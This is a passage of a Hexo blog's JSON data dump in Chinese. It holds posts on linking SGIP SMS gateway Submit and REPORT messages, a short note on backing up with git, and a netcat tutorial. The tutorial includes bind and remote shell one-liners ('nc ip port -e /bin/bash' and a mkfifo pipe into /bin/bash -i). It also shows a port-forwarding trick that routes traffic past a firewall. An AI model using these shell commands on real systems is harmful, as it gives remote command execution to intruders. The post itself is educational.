Submit内容\n```\nCommandId*\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSPNumber\tSP的接入号码，字符\nChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。\nUserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345\nCorpId\t企业代码，取值范围0-99999，字符\nServiceType\t业务代码，由SP定义，字符\nFeeType*\t计费类型，字符\nFeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符\n对于包月制收费的用户，该值为月租费的值\nGivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符\nAgentFlag\t代收费标志，0：应收；1：实收，字符\nMorelatetoMTFlag\t引起MT消息的原因\n0-MO点播引起的第一条MT消息；\n1-MO点播引起的非第一条MT消息；\n2-非MO点播引起的MT消息；\n3-系统反馈引起的MT消息。\n字符\nPriority\t优先级0-9从低到高，默认为0，十六进制数字\nExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间\nReportFlag\t状态报告标记\n0-该条消息只有最后出错时要返回状态报告\n1-该条消息无论最后是否成功都要返回状态报告\n2-该条消息不需要返回状态报告\n3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告\n其它-保留\n缺省设置为0，十六进制数字\nMessageType\t信息类型：\n0-短消息信息\n其它：待定\n\n十六进制数字\nTP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9\n十六进制数字\nTP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐\n十六进制数字\nMessageCoding\t短消息的编码格式。\n0：纯ASCII字符串\n3：写卡操作\n4：二进制编码\n8：UCS2编码\n15：GBK编码\n其它参见GSM3.38第4节：SMS Data Coding Scheme\n十六进制数字\nMessageContent\t短消息的内容，十六进制数字\nReserve\t保留，扩展用\n```\n###### REPORT内容\n```\nCommandId\t命令ID，十六进制数字\nSequenceNumber\t序列号，十六进制数字\nSubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字\nReportType\tReport命令类型\n0：对先前一条Submit命令的状态报告\n1：对先前一条前转Deliver命令的状态报告，十六进制数字\nUserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志\nState*\t该命令所涉及的短消息的当前执行状态\n0：发送成功\n1：等待发送\n2：发送失败\n十六进制数字\nErrorCode\t当State=2时为错误码值，否则为0，十六进制数字\nReserve\t保留，扩展用\n```\n###### 观察\n  请求时，返回：\n  ![REPORT1](../images/report1.jpg)\n  后台输出REPORT:\n  ![REPORT2](../images/report2.jpg)\n\n  通过对比发现其中有某两个字段相同，ok,到这基本搞定。\n\n###### 解决\n1.在Submit时，将SequenceNumber存储\n```\n//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3\nSubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();\nsubmitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));\nsubmitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));\nsubmitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));\nsubmitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));\nlogService.storeSubmitReportMap(submitReportMapEntity);\n```\n2.Report时通过SequenceNumber获取SP(外显号)\n```\nString spNumber_temp = new String();\nspNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));\n```\n","slug":"sgip","published":1,"updated":"2018-09-26T10:31:52.809Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr6404zj00056cvpk8trhm0v","content":"<h6 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题:\"></a>问题:</h6><p>在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。</p>\n<h6 id=\"Submit内容\"><a href=\"#Submit内容\" class=\"headerlink\" title=\"Submit内容\"></a>Submit内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId*\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SPNumber\tSP的接入号码，字符</span><br><span class=\"line\">ChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。</span><br><span class=\"line\">UserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345</span><br><span class=\"line\">CorpId\t企业代码，取值范围0-99999，字符</span><br><span class=\"line\">ServiceType\t业务代码，由SP定义，字符</span><br><span class=\"line\">FeeType*\t计费类型，字符</span><br><span class=\"line\">FeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符</span><br><span class=\"line\">对于包月制收费的用户，该值为月租费的值</span><br><span class=\"line\">GivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符</span><br><span class=\"line\">AgentFlag\t代收费标志，0：应收；1：实收，字符</span><br><span class=\"line\">MorelatetoMTFlag\t引起MT消息的原因</span><br><span class=\"line\">0-MO点播引起的第一条MT消息；</span><br><span class=\"line\">1-MO点播引起的非第一条MT消息；</span><br><span class=\"line\">2-非MO点播引起的MT消息；</span><br><span class=\"line\">3-系统反馈引起的MT消息。</span><br><span class=\"line\">字符</span><br><span class=\"line\">Priority\t优先级0-9从低到高，默认为0，十六进制数字</span><br><span class=\"line\">ExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ReportFlag\t状态报告标记</span><br><span class=\"line\">0-该条消息只有最后出错时要返回状态报告</span><br><span class=\"line\">1-该条消息无论最后是否成功都要返回状态报告</span><br><span class=\"line\">2-该条消息不需要返回状态报告</span><br><span class=\"line\">3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告</span><br><span class=\"line\">其它-保留</span><br><span class=\"line\">缺省设置为0，十六进制数字</span><br><span class=\"line\">MessageType\t信息类型：</span><br><span class=\"line\">0-短消息信息</span><br><span class=\"line\">其它：待定</span><br><span class=\"line\"></span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageCoding\t短消息的编码格式。</span><br><span class=\"line\">0：纯ASCII字符串</span><br><span class=\"line\">3：写卡操作</span><br><span class=\"line\">4：二进制编码</span><br><span class=\"line\">8：UCS2编码</span><br><span class=\"line\">15：GBK编码</span><br><span class=\"line\">其它参见GSM3.38第4节：SMS Data Coding Scheme</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageContent\t短消息的内容，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"REPORT内容\"><a href=\"#REPORT内容\" class=\"headerlink\" title=\"REPORT内容\"></a>REPORT内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字</span><br><span class=\"line\">ReportType\tReport命令类型</span><br><span class=\"line\">0：对先前一条Submit命令的状态报告</span><br><span class=\"line\">1：对先前一条前转Deliver命令的状态报告，十六进制数字</span><br><span class=\"line\">UserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志</span><br><span class=\"line\">State*\t该命令所涉及的短消息的当前执行状态</span><br><span class=\"line\">0：发送成功</span><br><span class=\"line\">1：等待发送</span><br><span class=\"line\">2：发送失败</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">ErrorCode\t当State=2时为错误码值，否则为0，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"观察\"><a href=\"#观察\" class=\"headerlink\" title=\"观察\"></a>观察</h6><p>  请求时，返回：<br>  <img src=\"../images/report1.jpg\" alt=\"REPORT1\"><br>  后台输出REPORT:<br>  <img src=\"../images/report2.jpg\" alt=\"REPORT2\"></p>\n<p>  通过对比发现其中有某两个字段相同，ok,到这基本搞定。</p>\n<h6 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h6><p>1.在Submit时，将SequenceNumber存储<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3</span><br><span class=\"line\">SubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();</span><br><span class=\"line\">submitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));</span><br><span class=\"line\">submitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));</span><br><span class=\"line\">submitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));</span><br><span class=\"line\">submitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));</span><br><span class=\"line\">logService.storeSubmitReportMap(submitReportMapEntity);</span><br></pre></td></tr></table></figure></p>\n<p>2.Report时通过SequenceNumber获取SP(外显号)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String spNumber_temp = new String();</span><br><span class=\"line\">spNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h6 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题:\"></a>问题:</h6><p>在联通SGIP网关中，Submit发送消息后，怎么将返回的REPORT与之关联起来。</p>\n<h6 id=\"Submit内容\"><a href=\"#Submit内容\" class=\"headerlink\" title=\"Submit内容\"></a>Submit内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId*\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SPNumber\tSP的接入号码，字符</span><br><span class=\"line\">ChargeNumber\t付费号码，字符，手机号码前加“86”国别标志；当且仅当群发且对用户收费时为空；如果为空，则该条短消息产生的费用由UserNumber代表的用户支付；如果为全零字符串“000000000000000000000”，表示该条短消息产生的费用由SP支付。</span><br><span class=\"line\">UserNumber\t一个或多个接收该短消息的手机号，手机号之间用逗号(,)隔开，字符，手机号码前加“86”国别标志，如8613001125453,8613001132345</span><br><span class=\"line\">CorpId\t企业代码，取值范围0-99999，字符</span><br><span class=\"line\">ServiceType\t业务代码，由SP定义，字符</span><br><span class=\"line\">FeeType*\t计费类型，字符</span><br><span class=\"line\">FeeValue\t取值范围0-99999，该条短消息的收费值，单位为分，由SP定义，字符</span><br><span class=\"line\">对于包月制收费的用户，该值为月租费的值</span><br><span class=\"line\">GivenValue\t取值范围0-99999，赠送用户的话费，单位为分，由SP定义，特指由SP向用户发送广告时的赠送话费，字符</span><br><span class=\"line\">AgentFlag\t代收费标志，0：应收；1：实收，字符</span><br><span class=\"line\">MorelatetoMTFlag\t引起MT消息的原因</span><br><span class=\"line\">0-MO点播引起的第一条MT消息；</span><br><span class=\"line\">1-MO点播引起的非第一条MT消息；</span><br><span class=\"line\">2-非MO点播引起的MT消息；</span><br><span class=\"line\">3-系统反馈引起的MT消息。</span><br><span class=\"line\">字符</span><br><span class=\"line\">Priority\t优先级0-9从低到高，默认为0，十六进制数字</span><br><span class=\"line\">ExpireTime\t短消息寿命的终止时间，如果为空，表示使用短消息中心的缺省值。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ScheduleTime\t短消息定时发送的时间，如果为空，表示立刻发送该短消息。时间内容为16个字符，格式为“yymmddhhmmsstnnp”，其中“tnnp”取固定值“032+”，即默认系统为北京时间</span><br><span class=\"line\">ReportFlag\t状态报告标记</span><br><span class=\"line\">0-该条消息只有最后出错时要返回状态报告</span><br><span class=\"line\">1-该条消息无论最后是否成功都要返回状态报告</span><br><span class=\"line\">2-该条消息不需要返回状态报告</span><br><span class=\"line\">3-该条消息仅携带包月计费信息，不下发给用户，要返回状态报告</span><br><span class=\"line\">其它-保留</span><br><span class=\"line\">缺省设置为0，十六进制数字</span><br><span class=\"line\">MessageType\t信息类型：</span><br><span class=\"line\">0-短消息信息</span><br><span class=\"line\">其它：待定</span><br><span class=\"line\"></span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_pid\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.9</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">TP_udhi\tGSM协议类型。详细解释请参考GSM03.40中的9.2.3.23,仅使用1位，右对齐</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageCoding\t短消息的编码格式。</span><br><span class=\"line\">0：纯ASCII字符串</span><br><span class=\"line\">3：写卡操作</span><br><span class=\"line\">4：二进制编码</span><br><span class=\"line\">8：UCS2编码</span><br><span class=\"line\">15：GBK编码</span><br><span class=\"line\">其它参见GSM3.38第4节：SMS Data Coding Scheme</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">MessageContent\t短消息的内容，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"REPORT内容\"><a href=\"#REPORT内容\" class=\"headerlink\" title=\"REPORT内容\"></a>REPORT内容</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CommandId\t命令ID，十六进制数字</span><br><span class=\"line\">SequenceNumber\t序列号，十六进制数字</span><br><span class=\"line\">SubmitSequenceNumber\t该命令所涉及的Submit或deliver命令的序列号，十六进制数字</span><br><span class=\"line\">ReportType\tReport命令类型</span><br><span class=\"line\">0：对先前一条Submit命令的状态报告</span><br><span class=\"line\">1：对先前一条前转Deliver命令的状态报告，十六进制数字</span><br><span class=\"line\">UserNumber\t接收该短消息的手机号，字符，手机号码前加“86”国别标志</span><br><span class=\"line\">State*\t该命令所涉及的短消息的当前执行状态</span><br><span class=\"line\">0：发送成功</span><br><span class=\"line\">1：等待发送</span><br><span class=\"line\">2：发送失败</span><br><span class=\"line\">十六进制数字</span><br><span class=\"line\">ErrorCode\t当State=2时为错误码值，否则为0，十六进制数字</span><br><span class=\"line\">Reserve\t保留，扩展用</span><br></pre></td></tr></table></figure>\n<h6 id=\"观察\"><a href=\"#观察\" class=\"headerlink\" title=\"观察\"></a>观察</h6><p>  请求时，返回：<br>  <img src=\"../images/report1.jpg\" alt=\"REPORT1\"><br>  后台输出REPORT:<br>  <img src=\"../images/report2.jpg\" alt=\"REPORT2\"></p>\n<p>  通过对比发现其中有某两个字段相同，ok,到这基本搞定。</p>\n<h6 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h6><p>1.在Submit时，将SequenceNumber存储<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//将seq与spNumber存储 SequenceNumber为 seq1+seq2+seq3</span><br><span class=\"line\">SubmitReportMapEntity submitReportMapEntity = new SubmitReportMapEntity();</span><br><span class=\"line\">submitReportMapEntity.setSeq1(String.valueOf(submit.getSeqno_1()));</span><br><span class=\"line\">submitReportMapEntity.setSeq2(String.valueOf(submit.getSeqno_2()));</span><br><span class=\"line\">submitReportMapEntity.setSeq3(String.valueOf(submit.getSeqno_3()));</span><br><span class=\"line\">submitReportMapEntity.setSpNumber(String.valueOf(submit.getSPNumber()));</span><br><span class=\"line\">logService.storeSubmitReportMap(submitReportMapEntity);</span><br></pre></td></tr></table></figure></p>\n<p>2.Report时通过SequenceNumber获取SP(外显号)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String spNumber_temp = new String();</span><br><span class=\"line\">spNumber_temp = logService.submitReportMapInquiry(String.valueOf(report.getSeq_2()),String.valueOf(report.getSeq_3()));</span><br></pre></td></tr></table></figure></p>\n"},{"title":"reinstall","date":"2018-08-20T01:37:39.000Z","toc":true,"_content":"\n## 重装\n重装系统，忘了备份本地md文件。不能找回，教训深刻。\n在这记录一下解决方案，以免以后遇到。\n1. 创建git分支\n2. 将文件提交上传到分支保存\n3. git clone\n","source":"_posts/reinstall.md","raw":"---\ntitle: reinstall\ndate: 2018-08-20 09:37:39\ntags: hexo\ntoc: true\n---\n\n## 重装\n重装系统，忘了备份本地md文件。不能找回，教训深刻。\n在这记录一下解决方案，以免以后遇到。\n1. 创建git分支\n2. 将文件提交上传到分支保存\n3. git clone\n","slug":"reinstall","published":1,"updated":"2018-08-31T09:51:50.889Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr6404zm00086cvptjcztt54","content":"<h2 id=\"重装\"><a href=\"#重装\" class=\"headerlink\" title=\"重装\"></a>重装</h2><p>重装系统，忘了备份本地md文件。不能找回，教训深刻。<br>在这记录一下解决方案，以免以后遇到。</p>\n<ol>\n<li>创建git分支</li>\n<li>将文件提交上传到分支保存</li>\n<li>git clone</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"重装\"><a href=\"#重装\" class=\"headerlink\" title=\"重装\"></a>重装</h2><p>重装系统，忘了备份本地md文件。不能找回，教训深刻。<br>在这记录一下解决方案，以免以后遇到。</p>\n<ol>\n<li>创建git分支</li>\n<li>将文件提交上传到分支保存</li>\n<li>git clone</li>\n</ol>\n"},{"title":"netcat","date":"2019-01-17T07:19:13.000Z","_content":"\nnetcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。\n\n#### 1.常用参数：\n```\n\t-4/6 使用IPv4/6地址\n\t-b 允许broadcast广播\n\t-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending\n\t-d 不尝试读取stdin\n\t-I length 设置TCP接收的buffer的大小\n\t-i interval 设置发送和接收间的延迟秒数，\n\t-l 监听模式\n\t-n 直接使用ip,不通过域名服务器DNS查询域名\n\t-o length  设置TCP发送的buffer大小\n\t-P 代理名字\n\t-p nc使用的端口\n\t-v verbose更多输出信息\n\t-w timeout\n\t-u 使用UDP\n\t-r 随机选择端口\n\t-s source  设置本地主机送出数据包的IP地址\n```\n#### 2.使用例子\n#####\t1.建立连接，聊天\n\t\tnc -l port 在本地主机监听一个端口<br>\n\t\tnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n#####\t2.端口扫描\n\t\t原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到<br>\n\t\tnc -v -n -z ip port(可以是范围)<br>\n\t\t\t-v进行详细输出<br>\n\t\t\t-n不进行域名查询<br>\n\t\t\t-z建立连接后关闭连接，不进行数据交换<br>\n#####\t3.数据传输(甚至可以传输流媒体）\n\t\t类似于聊天，只是将输入换成文件，使用重定向或者管道符<br>\n\t\tserver:  nc -l port < file1.txt<br>\n\t\tclien: nc -n ip port > file2txt<br>\n\t\tfile1往file2传数据<br>\n#####\t4.获取shell，正反向shell\n\t\t如果有-e参数，直接 nc ip port -e /bin/bash<br>\n\t\t无-e参数时:<br>\n\t\tserver:<br>\n\t\tmkfifo /tmp/fifo<br>\n\t\tcat /tmp/fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/fifo<br>\n\t\tclient:<br>\n\t\tnc ip port<br>\n\t\t原理：<br>\n\t\tbash -i 进入交互模式<br>\n\t\t通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n\n#####\t5.端口转发\n\t\t- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n\t\t- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n\t\t原理：<br>\n\t\t在102上：nc -l 8000<br>\n\t\t\t\t\t  cat /tmp/fifo | nc localhost 8000 | nc -l 9000 > /tmp/fifo\n\t\t在103上：<br>\n\t\t\t\tnc 192.168.1.102 9000<br>\n\t\t在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n","source":"_posts/netcat.md","raw":"---\ntitle: netcat\ndate: 2019-01-17 15:19:13\ntags:\n---\n\nnetcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。\n\n#### 1.常用参数：\n```\n\t-4/6 使用IPv4/6地址\n\t-b 允许broadcast广播\n\t-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending\n\t-d 不尝试读取stdin\n\t-I length 设置TCP接收的buffer的大小\n\t-i interval 设置发送和接收间的延迟秒数，\n\t-l 监听模式\n\t-n 直接使用ip,不通过域名服务器DNS查询域名\n\t-o length  设置TCP发送的buffer大小\n\t-P 代理名字\n\t-p nc使用的端口\n\t-v verbose更多输出信息\n\t-w timeout\n\t-u 使用UDP\n\t-r 随机选择端口\n\t-s source  设置本地主机送出数据包的IP地址\n```\n#### 2.使用例子\n#####\t1.建立连接，聊天\n\t\tnc -l port 在本地主机监听一个端口<br>\n\t\tnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n#####\t2.端口扫描\n\t\t原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到<br>\n\t\tnc -v -n -z ip port(可以是范围)<br>\n\t\t\t-v进行详细输出<br>\n\t\t\t-n不进行域名查询<br>\n\t\t\t-z建立连接后关闭连接，不进行数据交换<br>\n#####\t3.数据传输(甚至可以传输流媒体）\n\t\t类似于聊天，只是将输入换成文件，使用重定向或者管道符<br>\n\t\tserver:  nc -l port < file1.txt<br>\n\t\tclien: nc -n ip port > file2txt<br>\n\t\tfile1往file2传数据<br>\n#####\t4.获取shell，正反向shell\n\t\t如果有-e参数，直接 nc ip port -e /bin/bash<br>\n\t\t无-e参数时:<br>\n\t\tserver:<br>\n\t\tmkfifo /tmp/fifo<br>\n\t\tcat /tmp/fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/fifo<br>\n\t\tclient:<br>\n\t\tnc ip port<br>\n\t\t原理：<br>\n\t\tbash -i 进入交互模式<br>\n\t\t通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n\n#####\t5.端口转发\n\t\t- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n\t\t- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n\t\t原理：<br>\n\t\t在102上：nc -l 8000<br>\n\t\t\t\t\t  cat /tmp/fifo | nc localhost 8000 | nc -l 9000 > /tmp/fifo\n\t\t在103上：<br>\n\t\t\t\tnc 192.168.1.102 9000<br>\n\t\t在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n","slug":"netcat","published":1,"updated":"2019-01-17T07:22:27.605Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr6404zp00096cvpzeszv4m4","content":"<p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>\n<h4 id=\"1-常用参数：\"><a href=\"#1-常用参数：\" class=\"headerlink\" title=\"1.常用参数：\"></a>1.常用参数：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-4/6 使用IPv4/6地址</span><br><span class=\"line\">-b 允许broadcast广播</span><br><span class=\"line\">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class=\"line\">-d 不尝试读取stdin</span><br><span class=\"line\">-I length 设置TCP接收的buffer的大小</span><br><span class=\"line\">-i interval 